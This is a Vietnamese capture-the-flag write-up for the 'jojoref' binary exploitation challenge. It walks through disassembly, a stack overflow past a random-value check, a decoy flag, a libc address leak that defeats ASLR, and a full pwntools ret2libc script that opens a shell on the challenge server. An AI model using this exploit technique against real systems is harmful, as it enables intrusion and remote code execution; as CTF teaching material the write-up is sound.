**PZ**
---
Binary Exploitation

Description:
---
> Just a JoJo reference.

Solution:
---
Bài này thì khó hơn bài trước :joy: Chạy thử tiếp nào :point_down:

```bash
root@kali:~# ./jojoref
Pwn: Oh? You're approaching me? Instead of running away, you're coming right to me?
You: yes
[You said: yes]
Pwn: Oh ho... then come as close as you want
You: ok girl
root@kali:~#
```

Con này stripped rồi nên không dùng `gdb` để xem `main` được, dùng `objdump` hay cái gì đó khác nhé.
> Radare2, IDA hay Binary Ninja...
```asm
...

add     esp, 10h
mov     eax, ds:(stdout_ptr - 804A000h)[ebx]
mov     eax, [eax]
sub     esp, 8
push    0               ; buf
push    eax             ; stream
call    _setbuf
add     esp, 10h
call    sub_804872B
call    sub_8048676; <---| Chỗ này nhé, còn lại thì bình thường rồi.
mov     eax, 0
lea     esp, [ebp-8]
pop     ecx
pop     ebx
pop     ebp
lea     esp, [ecx-4]
retn
```

Xem hàm `sub_8048676` nào:
```asm
.text:08048676 buf             = byte ptr -1Ch
.text:08048676 var_C           = dword ptr -0Ch
.text:08048676 var_4           = dword ptr -4

...

.text:08048688                 mov     eax, offset unk_804A040; <--- Nhớ địa chỉ này không ??
.text:0804868E                 mov     eax, [eax]
.text:08048690                 mov     [ebp+var_C], eax; <--- Lấy số random lưu vào [ebp+var_C]
.text:08048693                 sub     esp, 0Ch
.text:08048696                 lea     eax, (aPwnOhYouReAppr - 804A000h)[ebx] ; "Pwn: Oh? You're approaching me? Instead"...
.text:0804869C                 push    eax             ; s
.text:0804869D                 call    _puts
.text:080486A2                 add     esp, 10h
.text:080486A5                 sub     esp, 0Ch
.text:080486A8                 lea     eax, (aYou - 804A000h)[ebx] ; "You: "
.text:080486AE                 push    eax             ; format
.text:080486AF                 call    _printf
.text:080486B4                 add     esp, 10h
.text:080486B7                 sub     esp, 8
.text:080486BA                 push    30h             ; nbytes <--- Lại cho nhập 0x30 bytes
.text:080486BC                 lea     eax, [ebp+buf]  ;        <--- Trong khi buffer chỉ có 0x1C bytes
.text:080486BF                 push    eax             ; buf
.text:080486C0                 call    sub_8048612     ;  <--- Hàm nhập và thay kí tự '\n' ở cuối chuỗi thành '\0'
.text:080486C5                 add     esp, 10h
.text:080486C8                 mov     eax, offset unk_804A040
.text:080486CE                 mov     eax, [eax]
.text:080486D0                 cmp     [ebp+var_C], eax ; <--- Kiểm tra lại xem số random lưu ở [ebp+var_C] có bị thay đổi không
.text:080486D3                 jz      short loc_80486DA  
.text:080486D5                 call    sub_80485B6  ; <--- Nếu đổi thì gọi hàm này

...
```
Xem nếu số random bị thay đổi thì ra cái gì nhé:
```asm
...
.text:080485C8                 sub     esp, 8
.text:080485CB                 push    0               ; oflag
.text:080485CD                 lea     eax, (aFlag - 804A000h)[ebx] ; "flag"
.text:080485D3                 push    eax             ; file
.text:080485D4                 call    _open  ; <--- Mở ra flag
.text:080485D9                 add     esp, 10h
.text:080485DC                 mov     [ebp+fd], eax
.text:080485DF                 cmp     [ebp+fd], 0
.text:080485E3                 js      short loc_8048608
.text:080485E5                 sub     esp, 4
.text:080485E8                 push    27h             ; nbytes
.text:080485EA                 lea     eax, [ebp+buf]
.text:080485ED                 push    eax             ; buf
.text:080485EE                 push    [ebp+fd]        ; fd
.text:080485F1                 call    _read  ; <--- Đọc ra flag
.text:080485F6                 add     esp, 10h
.text:080485F9                 sub     esp, 0Ch
.text:080485FC                 lea     eax, [ebp+buf]
.text:080485FF                 push    eax             ; s
.text:08048600                 call    _puts  ; <--- In ra flag, ez 15' gg :))
.text:08048605                 add     esp, 10h
...
```
Có vẻ như chỉ cần ghi đè qua `[ebp+var_C]` là ra flag. Ok đập phát chết luôn:
```bash
root@kali:~# python -c 'print "A"*18' | nc 3.91.78.13 10001
Pwn: Oh? You're approaching me? Instead of running away, you're coming right to me?
You: PTITCTF{ Well yes , but actually no. }   # <--- Bị lừa rồi ... 

root@kali:~# 
```

Thôi lại xem tiếp nếu không gọi `sub_80485B6` thì `loc_80486DA` có cái gì :sweat_smile: :
```asm
...
.text:080486DA                 sub     esp, 8
.text:080486DD                 lea     eax, [ebp+buf]
.text:080486E0                 push    eax
.text:080486E1                 lea     eax, (aYouSaidS - 804A000h)[ebx] ; "[You said: %s]\n"
.text:080486E7                 push    eax             ; format
.text:080486E8                 call    _printf
.text:080486ED                 add     esp, 10h
.text:080486F0                 sub     esp, 0Ch
.text:080486F3                 lea     eax, (aPwnOhHoThenCom - 804A000h)[ebx] ; "Pwn: Oh ho... then come as close as you"...
.text:080486F9                 push    eax             ; s
.text:080486FA                 call    _puts
.text:080486FF                 add     esp, 10h
.text:08048702                 sub     esp, 0Ch
.text:08048705                 lea     eax, (aYou - 804A000h)[ebx] ; "You: "
.text:0804870B                 push    eax             ; format
.text:0804870C                 call    _printf
.text:08048711                 add     esp, 10h
.text:08048714                 sub     esp, 8
.text:08048717                 push    30h             ; nbytes
.text:08048719                 lea     eax, [ebp+buf]
.text:0804871C                 push    eax             ; buf
.text:0804871D                 call    sub_8048612 ; <--- Lại hàm nhập, giống như đoạn code trước khi jmp
.text:08048722                 add     esp, 10h
.text:08048725                 nop
.text:08048726                 mov     ebx, [ebp+var_4]
.text:08048729                 leave
.text:0804872A                 retn
```
Lần thứ 2 nhập thì không check số random, có lẽ nên khai thác vào chỗ này.

Bài này thì người ta cho sẵn chuỗi `"/bin/sh"` ở `0x8048890` rồi nên 
gợi ý là sẽ return về `system("/bin/sh")`. Cơ mà lại không cho địa chỉ của `system`, và server bật `ASLR` nên cần phải tính thông qua địa chỉ của hàm nào đó đã cho.

Để ý trong suốt quá trình hàm `sub_8048676` này làm việc không thấy đả động gì đến vị trí `[ebp-8]`, có gì đó mờ ám chăng ?
```shell
Breakpoint 1, 0x0804867a in ?? ()
gdb-peda$ x/x $ebp-8
0xffffd370:	0xf7fadd80
gdb-peda$ info proc map
process 1764
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /root/jojoref
	 0x8049000  0x804a000     0x1000        0x0 /root/jojoref
	 0x804a000  0x804b000     0x1000     0x1000 /root/jojoref
	0xf7dd3000 0xf7dec000    0x19000        0x0 /usr/lib32/libc-2.28.so # <--- địa chỉ cơ sở libc nhé
	0xf7dec000 0xf7f3a000   0x14e000    0x19000 /usr/lib32/libc-2.28.so
	0xf7f3a000 0xf7faa000    0x70000   0x167000 /usr/lib32/libc-2.28.so
	0xf7faa000 0xf7fab000     0x1000   0x1d7000 /usr/lib32/libc-2.28.so
  ...
  
gdb-peda$ p/x 0xf7fadd80-0xf7dd3000
$1 = 0x1dad80
gdb-peda$ quit
root@kali:~# readelf -s /usr/lib32/libc-2.28.so | grep 1dad80
   905: 001dad80   152 OBJECT  GLOBAL DEFAULT   31 _IO_2_1_stdout_@@GLIBC_2.1 # <--- :))
root@kali:~#
```
Rồi thế là xong, chạy nhiều lần thì nó vẫn ra hàm đấy thôi. Còn lưu ý nữa là con này biên dịch bằng `GCC 7.3.0` cho nên việc tính ra system có thể bị sai,
vì kali của mình đang chạy `GCC 8.3.0`, chuyển qua ubuntu cho chắc:
```bash
zeltrax@z-pc:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep stdout
   783: 001d8ea0    80 OBJECT  GLOBAL DEFAULT   34 _IO_stdout_@@GLIBC_2.0
   895: 001d8d80   152 OBJECT  GLOBAL DEFAULT   34 _IO_2_1_stdout_@@GLIBC_2.1 # <--- Đây
  1168: 001d8e1c     4 OBJECT  GLOBAL DEFAULT   34 stdout@@GLIBC_2.0
zeltrax@z-pc:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   254: 00129640   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   652: 0003d200    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1510: 0003d200    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0 # <--- Và đây
zeltrax@z-pc:~$
```
Bài này phải xử lí run-time để leak ra `DWORD PTR [ebp-8]` nên phải code thôi:
```python
from pwn import *

#p = process("./jojoref")
p = remote('3.91.78.13', 10001)
s1 = "A"*16
print p.recvline()
print p.recv(5)

p.send(s1)

print p.recv(11+16)
urandom = p.recv(4)
ebp_8 = p.recv(4)

print "random: %s" % hex(u32(urandom))
print "$ebp-0x8: %s" % hex(u32(ebp_8))
system = u32(ebp_8)-(0x1d8d80-0x3d200)
print "system: %s" % hex(system)

s2 = "A"*32 + p32(system) + "JUNK" + p32(0x08048890)
print p.recvlines(2)
print p.recv(5)

p.sendline(s2)
p.interactive()
```
Nhớ flag fake không? Phải là flag2 cơ :grin:
```bash
[+] Opening connection to 3.91.78.13 on port 10001: Done
Pwn: Oh? You're approaching me? Instead of running away, you're coming right to me?

You: 
[You said: AAAAAAAAAAAAAAAA
random: 0xc09dc5bd
$ebp-0x8: 0xf7ecdd80
system: 0xf7d32200
]

Pwn: 
[*] Switching to interactive mode
Oh ho... then come as close as you want
You: $ cat flag2
PTITCTF{w3ll_y3s_0utst4nd1ng_m0v3_but_1t's_ill3g4l}
$ 
```
